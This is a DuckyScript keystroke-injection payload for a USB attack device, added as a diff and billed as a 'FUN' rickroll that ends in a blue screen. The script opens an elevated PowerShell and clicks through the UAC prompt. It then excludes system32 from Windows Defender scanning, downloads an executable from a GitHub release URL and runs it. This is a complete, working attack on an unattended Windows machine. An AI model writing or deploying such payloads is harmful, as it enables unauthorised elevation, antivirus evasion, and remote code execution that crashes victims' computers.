@@ -1,0 +1,19 @@
+REM Author: H4K0N42
+REM Description: Rickroll video ends up in BSOD
+REM Version: 1.0
+REM Category: FUN
+DELAY 400
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 850
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1000
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING $down=New-Object System.Net.WebClient;$url='https://github.com/AGO061/rickroll-bsod/releases/download/first-version/rick_dist.exe';$file='rick_dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+ENTER
